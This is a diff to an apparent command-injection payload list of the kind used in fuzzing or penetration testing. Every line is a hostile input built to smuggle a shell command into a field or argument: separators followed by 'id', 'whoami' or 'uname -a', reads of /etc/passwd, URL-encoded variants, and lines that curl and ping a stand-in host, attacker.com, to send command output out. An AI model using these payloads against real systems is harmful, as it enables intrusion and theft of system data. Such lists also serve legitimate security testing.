@@ -1,15 +1,23 @@
 ; id
 | id
+|| id
 & id
 && id
-|| id
 `id`
 $(id)
-;id;
-
-id
-
-%0aid
-%0d%0aid
-$(cat /etc/passwd)
 ; cat /etc/passwd
+| cat /etc/passwd
+; ls -la
+; whoami
+; uname -a
+$(cat /etc/passwd)
+`cat /etc/passwd`
+; curl http://attacker.com/$(id)
+; ping -c 1 attacker.com
+1; id
+1 | id
+1 && id
+1 || id
+%3B id
+%7C id
+%26 id
